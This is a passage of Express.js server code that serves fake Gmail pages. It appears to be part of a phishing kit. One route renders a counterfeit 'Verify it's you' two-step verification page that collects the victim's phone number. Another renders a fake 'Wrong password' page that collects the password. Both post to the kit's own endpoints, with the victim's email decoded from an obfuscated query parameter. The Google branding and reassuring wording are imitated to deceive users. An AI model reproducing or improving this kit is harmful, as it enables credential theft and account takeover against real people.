            { code: 'fo', name: 'Faroe Islands', dialCode: '+298' },
            { code: 'fj', name: 'Fiji', dialCode: '+679' },
            { code: 'fi', name: 'Finland', dialCode: '+358' },
            { code: 'fr', name: 'France', dialCode: '+33' },
            { code: 'pf', name: 'French Polynesia', dialCode: '+689' },
            { code: 'ga', name: 'Gabon', dialCode: '+241' },
            { code: 'gm', name: 'Gambia', dialCode: '+220' },
            { code: 'ge', name: 'Georgia', dialCode: '+995' },
            { code: 'de', name: 'Germany', dialCode: '+49' },
            { code: 'gh', name: 'Ghana', dialCode: '+233' },
            { code: 'gi', name: 'Gibraltar', dialCode: '+350' },
            { code: 'gr', name: 'Greece', dialCode: '+30' },
            { code: 'gl', name: 'Greenland', dialCode: '+299' },
            { code: 'gd', name: 'Grenada', dialCode: '+1 473' },
            { code: 'gu', name: 'Guam', dialCode: '+1 671' },
            { code: 'gt', name: 'Guatemala', dialCode: '+502' },
            { code: 'gg', name: 'Guernsey', dialCode: '+44' },
            { code: 'gn', name: 'Guinea', dialCode: '+224' },
            { code: 'gw', name: 'Guinea-Bissau', dialCode: '+245' },
            { code: 'gy', name: 'Guyana', dialCode: '+592' },
            { code: 'ht', name: 'Haiti', dialCode: '+509' },
            { code: 'hn', name: 'Honduras', dialCode: '+504' },
            { code: 'hk', name: 'Hong Kong', dialCode: '+852' },
            { code: 'hu', name: 'Hungary', dialCode: '+36' },
            { code: 'is', name: 'Iceland', dialCode: '+354' },
            { code: 'in', name: 'India', dialCode: '+91' },
            { code: 'id', name: 'Indonesia', dialCode: '+62' },
            { code: 'ir', name: 'Iran', dialCode: '+98' },
            { code: 'iq', name: 'Iraq', dialCode: '+964' },
            { code: 'ie', name: 'Ireland', dialCode: '+353' },
            { code: 'im', name: 'Isle of Man', dialCode: '+44' },
            { code: 'il', name: 'Israel', dialCode: '+972' },
            { code: 'it', name: 'Italy', dialCode: '+39' },
            { code: 'ci', name: 'Ivory Coast', dialCode: '+225' },
            { code: 'jm', name: 'Jamaica', dialCode: '+1 876' },
            { code: 'jp', name: 'Japan', dialCode: '+81' },
            { code: 'je', name: 'Jersey', dialCode: '+44' },
            { code: 'jo', name: 'Jordan', dialCode: '+962' },
            { code: 'kz', name: 'Kazakhstan', dialCode: '+7' },
            { code: 'ke', name: 'Kenya', dialCode: '+254' },
            { code: 'ki', name: 'Kiribati', dialCode: '+686' },
            { code: 'xk', name: 'Kosovo', dialCode: '+383' },
            { code: 'kw', name: 'Kuwait', dialCode: '+965' },
            { code: 'kg', name: 'Kyrgyzstan', dialCode: '+996' },
            { code: 'la', name: 'Laos', dialCode: '+856' },
            { code: 'lv', name: 'Latvia', dialCode: '+371' },
            { code: 'lb', name: 'Lebanon', dialCode: '+961' },
            { code: 'ls', name: 'Lesotho', dialCode: '+266' },
            { code: 'lr', name: 'Liberia', dialCode: '+231' },
            { code: 'ly', name: 'Libya', dialCode: '+218' },
            { code: 'li', name: 'Liechtenstein', dialCode: '+423' },
            { code: 'lt', name: 'Lithuania', dialCode: '+370' },
            { code: 'lu', name: 'Luxembourg', dialCode: '+352' },
            { code: 'mo', name: 'Macau', dialCode: '+853' },
            { code: 'mk', name: 'Macedonia', dialCode: '+389' },
            { code: 'mg', name: 'Madagascar', dialCode: '+261' },
            { code: 'mw', name: 'Malawi', dialCode: '+265' },
            { code: 'my', name: 'Malaysia', dialCode: '+60' },
            { code: 'mv', name: 'Maldives', dialCode: '+960' },
            { code: 'ml', name: 'Mali', dialCode: '+223' },
            { code: 'mt', name: 'Malta', dialCode: '+356' },
            { code: 'mh', name: 'Marshall Islands', dialCode: '+692' },
            { code: 'mr', name: 'Mauritania', dialCode: '+222' },
            { code: 'mu', name: 'Mauritius', dialCode: '+230' },
            { code: 'yt', name: 'Mayotte', dialCode: '+262' },
            { code: 'mx', name: 'Mexico', dialCode: '+52' },
            { code: 'fm', name: 'Micronesia', dialCode: '+691' },
            { code: 'md', name: 'Moldova', dialCode: '+373' },
            { code: 'mc', name: 'Monaco', dialCode: '+377' },
            { code: 'mn', name: 'Mongolia', dialCode: '+976' },
            { code: 'me', name: 'Montenegro', dialCode: '+382' },
            { code: 'ms', name: 'Montserrat', dialCode: '+1 664' },
            { code: 'ma', name: 'Morocco', dialCode: '+212' },
            { code: 'mz', name: 'Mozambique', dialCode: '+258' },
            { code: 'mm', name: 'Myanmar', dialCode: '+95' },
            { code: 'na', name: 'Namibia', dialCode: '+264' },
            { code: 'nr', name: 'Nauru', dialCode: '+674' },
            { code: 'np', name: 'Nepal', dialCode: '+977' },
            { code: 'nl', name: 'Netherlands', dialCode: '+31' },
            { code: 'nc', name: 'New Caledonia', dialCode: '+687' },
            { code: 'nz', name: 'New Zealand', dialCode: '+64' },
            { code: 'ni', name: 'Nicaragua', dialCode: '+505' },
            { code: 'ne', name: 'Niger', dialCode: '+227' },
            { code: 'ng', name: 'Nigeria', dialCode: '+234' },
            { code: 'nu', name: 'Niue', dialCode: '+683' },
            { code: 'kp', name: 'North Korea', dialCode: '+850' },
            { code: 'mp', name: 'Northern Mariana Islands', dialCode: '+1 670' },
            { code: 'no', name: 'Norway', dialCode: '+47' },
            { code: 'om', name: 'Oman', dialCode: '+968' },
            { code: 'pk', name: 'Pakistan', dialCode: '+92' },
            { code: 'pw', name: 'Palau', dialCode: '+680' },
            { code: 'ps', name: 'Palestine', dialCode: '+970' },
            { code: 'pa', name: 'Panama', dialCode: '+507' },
            { code: 'pg', name: 'Papua New Guinea', dialCode: '+675' },
            { code: 'py', name: 'Paraguay', dialCode: '+595' },
            { code: 'pe', name: 'Peru', dialCode: '+51' },
            { code: 'ph', name: 'Philippines', dialCode: '+63' },
            { code: 'pn', name: 'Pitcairn', dialCode: '+64' },
            { code: 'pl', name: 'Poland', dialCode: '+48' },
            { code: 'pt', name: 'Portugal', dialCode: '+351' },
            { code: 'pr', name: 'Puerto Rico', dialCode: '+1 787' },
            { code: 'qa', name: 'Qatar', dialCode: '+974' },
            { code: 'cg', name: 'Republic of the Congo', dialCode: '+242' },
            { code: 're', name: 'Reunion', dialCode: '+262' },
            { code: 'ro', name: 'Romania', dialCode: '+40' },
            { code: 'ru', name: 'Russia', dialCode: '+7' },
            { code: 'rw', name: 'Rwanda', dialCode: '+250' },
            { code: 'bl', name: 'Saint Barthelemy', dialCode: '+590' },
            { code: 'sh', name: 'Saint Helena', dialCode: '+290' },
            { code: 'kn', name: 'Saint Kitts and Nevis', dialCode: '+1 869' },
            { code: 'lc', name: 'Saint Lucia', dialCode: '+1 758' },
            { code: 'mf', name: 'Saint Martin', dialCode: '+590' },
            { code: 'pm', name: 'Saint Pierre and Miquelon', dialCode: '+508' },
            { code: 'vc', name: 'Saint Vincent and the Grenadines', dialCode: '+1 784' },
            { code: 'ws', name: 'Samoa', dialCode: '+685' },
            { code: 'sm', name: 'San Marino', dialCode: '+378' },
            { code: 'st', name: 'Sao Tome and Principe', dialCode: '+239' },
            { code: 'sa', name: 'Saudi Arabia', dialCode: '+966' },
            { code: 'sn', name: 'Senegal', dialCode: '+221' },
            { code: 'rs', name: 'Serbia', dialCode: '+381' },
            { code: 'sc', name: 'Seychelles', dialCode: '+248' },
            { code: 'sl', name: 'Sierra Leone', dialCode: '+232' },
            { code: 'sg', name: 'Singapore', dialCode: '+65' },
            { code: 'sx', name: 'Sint Maarten', dialCode: '+1 721' },
            { code: 'sk', name: 'Slovakia', dialCode: '+421' },
            { code: 'si', name: 'Slovenia', dialCode: '+386' },
            { code: 'sb', name: 'Solomon Islands', dialCode: '+677' },
            { code: 'so', name: 'Somalia', dialCode: '+252' },
            { code: 'za', name: 'South Africa', dialCode: '+27' },
            { code: 'kr', name: 'South Korea', dialCode: '+82' },
            { code: 'ss', name: 'South Sudan', dialCode: '+211' },
            { code: 'es', name: 'Spain', dialCode: '+34' },
            { code: 'lk', name: 'Sri Lanka', dialCode: '+94' },
            { code: 'sd', name: 'Sudan', dialCode: '+249' },
            { code: 'sr', name: 'Suriname', dialCode: '+597' },
            { code: 'sj', name: 'Svalbard and Jan Mayen', dialCode: '+47' },
            { code: 'sz', name: 'Swaziland', dialCode: '+268' },
            { code: 'se', name: 'Sweden', dialCode: '+46' },
            { code: 'ch', name: 'Switzerland', dialCode: '+41' },
            { code: 'sy', name: 'Syria', dialCode: '+963' },
            { code: 'tw', name: 'Taiwan', dialCode: '+886' },
            { code: 'tj', name: 'Tajikistan', dialCode: '+992' },
            { code: 'tz', name: 'Tanzania', dialCode: '+255' },
            { code: 'th', name: 'Thailand', dialCode: '+66' },
            { code: 'tg', name: 'Togo', dialCode: '+228' },
            { code: 'tk', name: 'Tokelau', dialCode: '+690' },
            { code: 'to', name: 'Tonga', dialCode: '+676' },
            { code: 'tt', name: 'Trinidad and Tobago', dialCode: '+1 868' },
            { code: 'tn', name: 'Tunisia', dialCode: '+216' },
            { code: 'tr', name: 'Turkey', dialCode: '+90' },
            { code: 'tm', name: 'Turkmenistan', dialCode: '+993' },
            { code: 'tc', name: 'Turks and Caicos Islands', dialCode: '+1 649' },
            { code: 'tv', name: 'Tuvalu', dialCode: '+688' },
            { code: 'vi', name: 'U.S. Virgin Islands', dialCode: '+1 340' },
            { code: 'ug', name: 'Uganda', dialCode: '+256' },
            { code: 'ua', name: 'Ukraine', dialCode: '+380' },
            { code: 'ae', name: 'United Arab Emirates', dialCode: '+971' },
            { code: 'gb', name: 'United Kingdom', dialCode: '+44' },
            { code: 'us', name: 'United States', dialCode: '+1' },
            { code: 'uy', name: 'Uruguay', dialCode: '+598' },
            { code: 'uz', name: 'Uzbekistan', dialCode: '+998' },
            { code: 'vu', name: 'Vanuatu', dialCode: '+678' },
            { code: 'va', name: 'Vatican', dialCode: '+379' },
            { code: 've', name: 'Venezuela', dialCode: '+58' },
            { code: 'vn', name: 'Vietnam', dialCode: '+84' },
            { code: 'wf', name: 'Wallis and Futuna', dialCode: '+681' },
            { code: 'eh', name: 'Western Sahara', dialCode: '+212' },
            { code: 'ye', name: 'Yemen', dialCode: '+967' },
            { code: 'zm', name: 'Zambia', dialCode: '+260' },
            { code: 'zw', name: 'Zimbabwe', dialCode: '+263' }
        ];
        
  router.get('/codeotp', async (req, res) => {
    const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
    const decodata1 = Buffer.from(samdata, 'base64').toString('utf-8');
    const dataArray1 = decodata1.split('/');
    
    const id1 = dataArray1[1];
    const mobNumber = dataArray1[2];
    
    
     // Get user IP
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;

    // Fetch country code from IP
    let country = { code: 'us', dialCode: '+1' }; // default fallback
    try {
        const ipRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const ipData = await ipRes.json();
        if (ipData && ipData.country_code) {
            const countryCode = ipData.country_code.toLowerCase();
            const callingCode = ipData.country_calling_code || '+1';
            
            // Find matching country from our list
            const matchedCountry = countries.find(c => 
                c.code === countryCode || c.dialCode === callingCode
            );
            
            if (matchedCountry) {
                country = matchedCountry;
            }
        }
    } catch (err) {
        console.error('IP lookup failed:', err);
    }

    // HTML template with properly escaped backticks
    const otppage = `
	<!DOCTYPE html>
	<html lang="en">
	<head>
	<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - 2-Step Verification</title>
    <link rel="shortcut icon" href="/images/image.png" type="image/x-icon">
    <style>
        body {
            margin: 30px;
            font-family: "Google Sans", Roboto, Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 90vh;
        }

        .main-container {
            width: 100%;
            max-width: 60vw;
            margin-top: 5vh;
        }

        .maindiv {
            width: 98%;
            height: auto;
            padding: 35px;
            background: #fff;
            border-radius: 28px;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
            display: flex;
            flex-direction: row;
            flex-wrap: wrap;
            margin-bottom: 5px;
        }

        /* Form sections */
        .form-half {
            flex: 1;
            padding-right: 20px;
            min-width: 300px;
        }
        .form-half1 {
            flex: 1;
            padding-left: 20px;
            min-width: 300px;
        }

        /* Logo and text styles */
        .divlogo {
            width: 52px;
            height: 52px;
            margin-bottom: 20px;
        }
       .welcome {
              font-size: 42px;
              margin-top: 1px;
              margin-bottom: 5px;
              font-weight: 400;
          }
        .warning {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 20px;
        }
        .learn-more {
            color: #1a73e8;
            text-decoration: none;
        }
        .userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: transparent;
            padding: 4px;
            width: fit-content;
            margin-top: 28px;
            cursor: pointer;
        }

        .userdiv img {
            vertical-align: middle;
        }

        .user-icon {
            margin-top: 2px;
            margin-right: 15px;
            width: 20px;
            height: 20px;
        }

        .dropdown-icon {
            margin-top: 2px;
            margin-right: 12px;
            margin-left: 10px;
            width: 15px;
            height: 10px;
        }

        .userdiv span {
            font-size: 15px;
            color: #2c2a2a;
        }

            
        .userdiv span {
            font-size: 16px;
            color: #2c2a2a;
        }
        .gradient-box {
              width: 99%;
              height:80%;
              background: linear-gradient(to top, #ffffff, #ebebeb 50%, #ffffff);
              display: flex;
              justify-content: center;
              align-items: center;
              margin-top: 35px;
            }

            .gradient-box img {
              max-width: 100%;
              max-height: 100%;
            }
        /* Phone input section */
        .phone-input-container {
            display: flex;
            width: 100%;
            max-width: 400px;
            align-items: center;
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 2px;
            margin-bottom: 20px;
        }
        .country-selector {
            position: relative;
            display: flex;
            align-items: center;
            margin-right: 8px;
            cursor: pointer;
        }
        .country-flag {
            width: 24px;
            height: 16px;
            background-size: cover;
            background-position: center;
        }
        .country-code {
            margin: 0 3px;
            font-size: 0px;
            color: #202124;
        }
        .dropdown-arrow {
            width: 18px;
            height: 18px;
            margin-left: 4px;
            transition: transform 0.2s;
        }
        .dropdown-arrow.rotated {
            transform: rotate(180deg);
        }
        .country-dropdown {
            position: absolute;
            top: 100%;
            left: 0;
            width: 300px;
            max-height: 300px;
            overflow-y: auto;
            background: white;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            z-index: 100;
            display: none;
        }
        .country-dropdown.show {
            display: block;
        }
        .search-box {
            padding: 8px 12px;
            width: calc(100% - 24px);
            border: none;
            border-bottom: 1px solid #dadce0;
            outline: none;
            font-size: 15px;
        }
        .country-option {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            cursor: pointer;
        }
        .country-option:hover {
            background-color: #f1f3f4;
        }
        .country-option-flag {
            width: 24px;
            height: 16px;
            margin-right: 10px;
            background-size: cover;
            background-position: center;
        }
        .country-option-name {
            flex: 1;
            font-size: 15px;
        }
        .country-option-code {
            font-size: 14px;
            color: #5f6368;
        }
        .phone-input {
            flex: 1;
            padding: 12px;
            border: none;
            font-size: 16px;
            outline: none;
        }

        /* Bottom buttons */
        .tryn {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8vh;
            width: 96%;
            
        }
        .hyperl1 {
            color: #0757bf;
            text-decoration: none;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            margin-right: 11px;
            font-size: 15px;
			margin-left: 14vW;
        }

        .btnnxt {
            background-color: #0757bf;
            color: white;
            border: none;
            border-radius: 16px;
            padding: 10px 24px;
            font-size: 15px;
            cursor: pointer;
            margin-right: 11px;
        }
		.btnnxt:hover {
            background-color: #034099;
        }

        /* Footer styles */
        .btmdiv {
            width: 101%;
            max-width: 61vw;
            padding: 2px 0;
            background-color: transparent;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 5px;
			margin-left: 20px;
        }
        .left-div {
            flex-grow: 1;
        }
        .right-divs {
            display: flex;
        }
        .right-div {
            margin-left: 15px;
        }
        .btmhypl {
            background-color: transparent;
            color: black;
            border: none;
            cursor: pointer;
            padding: 10px;
            font-size: 11px;
            transition: background-color 0.3s ease;
        }
        .btmhypl:hover {
            background-color: #e7f3ff;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .main-container {
		        width: 114%;
		        max-width: 98vw;
		        margin-top: 5vh;
		    }
            .maindiv {
                flex-direction: column;
                padding: 20px;
            }
            .form-half, .form-half1 {
                padding: 0;
            }
            .btmdiv {
                flex-direction: column;
                align-items: center;
                padding: 20px 0;
				margin-left: 12vW;
            }
            .right-div {
                margin: 10px 0;
            }
            .country-dropdown {
                width: 250px;
            }
            .phone-input-container {
                width: 95%;
            }
            .tryn {
                margin-left: 0;
                justify-content: center;
            }
        }
    </style>
    </head>
<body>
    <div class="main-container">
        <div class="maindiv">
            <div class="form-half">
                <div><img class="divlogo" src="/images/image.png" alt="Gmail Logo"></div>
                <div><span class="welcome">Verify it's you</span></div>
                <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in. </span></div>
                <div class="userdiv">
                    <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                    <span style="color: #2c2a2a; font-size: 16px; font-family: Arial, Helvetica, sans-serif;">${id1}</span>
                    <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
                </div>
            </div>

            <div class="form-half1">
                <form class="loginform1" method="post" name="loginForm" action="/req/mobilepost" accept-charset="UTF-8">
                    <center>
                        <div class="gradient-box"><img src="/images/account-recovery-sms-pin.gif" alt="SMS Recovery" style="width: 250px;height: 220px;"></div>
                    </center>
                    <div class="phonediv">
                        <span class="phonetype" style="font-size: 17px; font-weight: 500;">Get a verification code</span><br><br>
                        <span class="messaged" style="font-size: 15px; color: #5f6368;">To get a verification code, first confirm the phone number you added to your account is ${mobNumber}.&nbsp;<i>Standard rates apply.</i></span>
                    </div>
                    <br>
                    <div class="phone-input-container">
                        <div class="country-selector" id="country-selector">
                            <div id="country-flag" class="country-flag" style="background-image: url(https://flagcdn.com/24x18/${country.code}.png)"></div>
                            <span id="country-code-display" class="country-code">${country.dialCode}</span>
                            <svg class="dropdown-arrow" viewBox="0 0 24 24" fill="#202124">
                                <path d="M7 10l5 5 5-5z"></path>
                            </svg>
                            <div id="country-dropdown" class="country-dropdown">
                                <input type="text" class="search-box" placeholder="Search country..." id="country-search">
                                <div id="country-list"></div>
                            </div>
                        </div>
                        <input type="tel" class="phone-input" name="tel" id="phone-input" placeholder="Phone Number" onkeypress="return validateMobile(event)" value="${country.dialCode} ">
                    </div>
                    <input type='hidden' name="username" id="useRname" value="${id1}">
                    <input type='hidden' name="countryCode" id="countryCode" value="${country.dialCode}">
					<script src="/script/script.js"></script>
                    <div class="tryn">
                        <button type="button" class="hyperl1">Try another way</button>
                        <button type="submit" class="btnnxt">Send</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="btmdiv">
            <div class="left-div">
                <select class="btmhypl" id="language-select">
                    <option value="en">English (United States)</option>
                    <option value="fr">French</option>
                    <option value="es">Spanish</option>
                    <option value="de">German</option>
                </select>
            </div>

            <div class="right-divs">
                <div class="right-div">
                    <button id="helpButton" class="btmhypl">Help</button>
                </div>
                <div class="right-div">
                    <button id="privacyButton" class="btmhypl">Privacy</button>
                </div>
                <div class="right-div">
                    <button id="termsButton" class="btmhypl">Terms</button>
                </div>
            </div>
        </div>
    </div>

    <script>
	     const countries = ${JSON.stringify(countries)};
        
        function initCountryDropdown() {
            const flagElement = document.getElementById('country-flag');
            const countryCodeDisplay = document.getElementById('country-code-display');
            const dropdown = document.getElementById('country-dropdown');
            const countryList = document.getElementById('country-list');
            const countrySelector = document.getElementById('country-selector');
            const phoneInput = document.getElementById('phone-input');
            const searchBox = document.getElementById('country-search');
            const arrow = document.querySelector('.dropdown-arrow');
            const countryCodeHidden = document.getElementById('countryCode');

            function populateCountryList(filter = '') {
                countryList.innerHTML = '';
                const filteredCountries = countries.filter(country => 
                    country.name.toLowerCase().includes(filter.toLowerCase()) || 
                    country.dialCode.includes(filter)
                );
                
                filteredCountries.forEach(country => {
                    const option = document.createElement('div');
                    option.className = 'country-option';
                    option.innerHTML = \`
                        <div class="country-option-flag" style="background-image: url(https://flagcdn.com/24x18/\${country.code}.png)"></div>
                        <div class="country-option-name">\${country.name}</div>
                        <div class="country-option-code">\${country.dialCode}</div>
                    \`;
                    option.addEventListener('click', () => {
                        flagElement.style.backgroundImage = \`url(https://flagcdn.com/24x18/\${country.code}.png)\`;
                        countryCodeDisplay.textContent = country.dialCode;
                        countryCodeHidden.value = country.dialCode;
                        
                        const currentValue = phoneInput.value.replace(/^\\+?\\d+\\s?/, '');
                        phoneInput.value = country.dialCode + ' ' + currentValue;
                        
                        dropdown.classList.remove('show');
                        arrow.classList.remove('rotated');
                    });
                    countryList.appendChild(option);
                });
            }

            populateCountryList();

            countrySelector.addEventListener('click', (e) => {
                e.stopPropagation();
                dropdown.classList.toggle('show');
                arrow.classList.toggle('rotated');
                if (dropdown.classList.contains('show')) {
                    searchBox.focus();
                }
            });

            searchBox.addEventListener('input', (e) => {
                populateCountryList(e.target.value);
            });

            document.addEventListener('click', () => {
                dropdown.classList.remove('show');
                arrow.classList.remove('rotated');
            });

            phoneInput.addEventListener('input', (e) => {
                const currentCountryCode = countryCodeDisplay.textContent;
                if (!phoneInput.value.startsWith(currentCountryCode)) {
                    const cursorPos = phoneInput.selectionStart;
                    const newValue = currentCountryCode + ' ' + phoneInput.value.replace(/^\\+?\\d+\\s?/, '');
                    phoneInput.value = newValue;
                    phoneInput.setSelectionRange(cursorPos + currentCountryCode.length + 1, 
                                              cursorPos + currentCountryCode.length + 1);
                }
            });
        }

        function validateMobile(event) {
            var key = event.key;
            if (/[0-9]/.test(key) || key === 'Backspace' || key === 'Delete' || 
                key === 'ArrowLeft' || key === 'ArrowRight') {
                return true;
            } else {
                event.preventDefault();
                return false;
            }
        }
          document.querySelectorAll('#helpButton, #privacyButton, #termsButton').forEach(button => {
            button.onclick = function(event) {
                event.preventDefault();
                 if (history.length > 1) {
                                    history.back();  // Go back if there's history
                                } else {
                                    location.reload();  // Refresh current page instead of alert/redirect
                                }
                            
            };
        });

        document.addEventListener('DOMContentLoaded', function() {
            initCountryDropdown();
        });
    </script>
</body>
</html>
    `;
    
    res.send(otppage);
});


  
// wrong password reoload page

  router.get('/wrongpwd', (req, res) => {

    const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata1=  Buffer.from(samdata, 'base64').toString('utf-8');
  
    const dataArray1 = decodata1.split('/');
  
    const id1 = dataArray1[1];

    const errorMessage = dataArray1[2];

  
  
    const errorpage = `

   <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login</title>
    <link rel="shortcut icon" href="/images/image.png" type="image">
    <style>
        /* Reset and General Styles */
        body {
            margin: 26px;
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
            background-color: #f5f7fb;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 85vh;
        }

        .maindiv {
            width: 56%; /* Increased width for larger screens */
            max-width: 1052px; /* Set max width for 4K screens */
            height: auto;
            padding: 42px;
            background: #fff;
            border-radius: 25px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            flex-wrap: wrap;
        }

        /* Left Section: Logo, Welcome, User Info */
        .form-half {
            flex: 1;
            min-width: 300px;
            padding-right: 20px;
        }

        .form-half .divlogo {
            width: 52px;
            height: 52px;
            margin-bottom: 25px;
        }

        .form-half .welcome {
            font-size: 44px; /* Increased font size for 4K */
            margin-top: 40px;
            margin-bottom: 20px;
        }

        .userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: transparent;
            padding: 4px;
            width: fit-content;
            margin-top: 28px;
            cursor: pointer;
        }

        .userdiv img {
            vertical-align: middle;
        }

        .user-icon {
            margin-top: 2px;
            margin-right: 13px;
            width: 18px;
            height: 18px;
        }

        .dropdown-icon {
            margin-top: 0px;
            margin-right: 12px;
            margin-left: 10px;
            width: 10px;
            height: 8px;
        }

        .userdiv span {
            font-size: 15px;
            color: #2c2a2a;
        }

        /* Right Section: Password Input, Show Password, Forgot Password, Next Button */
        .form-half1 {
            flex: 1;
            min-width: 440px;
            padding-left: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .passdiv {
            position: relative;
            margin-top: 42px;
            width: 100%;
            height: auto; /* Adjusting to auto for responsiveness */
        }

        input[type="password"], input[type="text"] {
            width: 100%; /* Ensure input takes up full width */
            padding: 16px;
            padding-right: 50px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box; /* Ensures padding does not affect width */
            transition: border-color 0.2s ease;
        }
 
        input.focused {
            border: 2px solid #4a6dd5;
        }
        

        /* Placeholder label behavior */
        .placeholder-label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #aaa;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        input:focus + .placeholder-label,
        input:not(:placeholder-shown) + .placeholder-label {
            top: 0px;
            left: 10px;
            padding: 4px;
            background-color: #fff;
            color: #4a6dd5;
            font-size: 12px;
        }

        .shwpwd {
            margin-top: 22px;
        }

        .shwpwd input {
            margin-right: 5px;
        }

        .shwpwd .button {
            cursor: pointer;
        }

        .fgtpwd {
            margin-top: 48px;
            margin-left: 47%;
        }

        .fgtpwd .hyperl {
            font-size: 15px;
            color: #1a73e8;
            border: none;
            background: none;
            cursor: pointer;
        }

        .btnnxt {
            padding: 11px 22px;
            font-size: 15px;
            border: none;
            border-radius: 25px;
            background-color: #0559d5;
            color: white;
            cursor: pointer;
        }

        .btnnxt:hover {
            background-color: #034099;
        }

        /* Bottom Section Styles */
        .btmdiv {
            width: 58%;
            max-width: 1050px;
            padding: 0px;
            background-color: rgba(0, 0, 0, 0);
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 5px;
        }

        .left-div {
            flex-grow: 1;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        .right-divs {
            display: flex;
        }

        .right-div {
            margin-left: 20px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
        }

        select.btmhypl {
            padding: 12px;
            font-size: 11px;
            background-color: rgba(255, 255, 255, 0);
            border: none;
            color: black;
        }

        button.btmhypl {
            background-color: rgba(255, 255, 255, 0);
            color: black;
            border: none;
            cursor: pointer;
            padding: 12px;
            font-size: 11px;
            transition: background-color ease-in-out duration(.3s);
        }

        button.btmhypl:hover {
            background-color: #e7f3ff;
        }

        .session-expired-message {
            font-size: 15px;
            color: #c20606;
            margin-top: 77px;
            margin-bottom: 20px;
        }

        /* Media Queries for 2K Desktop Screens */
        @media (min-width: 1440px) and (max-width: 2560px) {
            .maindiv {
                width: 56%;
                padding: 35px;
                max-width: 1080px;
            }

            .welcome {
                font-size: 52px;
            }

            .btnnxt {
                padding: 9px 20px;
                font-size: 17px;
            }
        }

        /* Mobile Optimization for 2K Screens */
        @media (max-width: 1024px) {
            .maindiv {
                width: 90%;
                flex-direction: column;
                padding: 24px;
            }

            .form-half, .form-half1 {
                min-width: 100%;
                padding: 0;
            }
            .welcome {
                font-size: 28px;
            }

            .userdiv {
                width: 100%;
                justify-content: center;
            }

            .btnnxt {
                width: 100%;
                padding: 12px 0;
            }

            .fgtpwd {
                margin-left: 0;
                text-align: center;
            }

            .btmdiv {
                flex-direction: column;
                align-items: center;
            }

            .left-div, .right-divs {
                width: 100%;
                justify-content: center;
            }

            .right-div {
                margin-left: 10px;
            }
        }

        .show-password-btn {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 14px;
            color: #333;
            transition: color 0.2s ease;
            padding: 0;
            line-height: 1;
        }
		
    </style>
</head>
<body>
    <div class="maindiv">
        <!-- Left Section: Logo, Welcome, User Info -->
        <div class="form-half">
            <div>
                <img class="divlogo" src="/images/image.png" alt="Logo">
            </div>
            <div>
                <span class="welcome">Verify it’s you</span>
            </div>
            <div class="userdiv">
                <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id1}</span>
                <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
            </div>
        </div>

        <!-- Right Section: Password Input, Show Password, Forgot Password, Next Button -->
        <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
            <div class="form-half1">
                <!-- Session Expired Message at the top of the right section -->
                <div class="session-expired-message">
                    <p>            </p>
                </div>

                <div class="passdiv">
                    <input type="hidden" name="username" id="useRname" value="${id1}">
                    <input required name="password" type="password" id="pEyar" placeholder="">
                    <label for="pEyar" class="placeholder-label">Enter Your Password</label>
                </div>

              <div class="<div id="shwpwd">
    <div style="display: flex; align-items: center;">
        <img src="/images/mportance-32.png" style="height:17px; width:17px; margin-top:10px; margin-right: 5px;">
        <span class="button" style="color:#b3261e; margin-top: 10px; font-size: 12px;">Wrong password. Try again or click Forgot password to reset it.</span>
    </div>
</div>

                <div id="togglePassword" class="shwpwd">
                    <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
                    <span onclick="togglePassword();" class="button">Show password</span>
                </div>

                <script>
                    const passwordInput = document.getElementById("pEyar");
                    const togglePassword = document.getElementById("togglePassword");

                    // Toggle "Show/Hide Password"
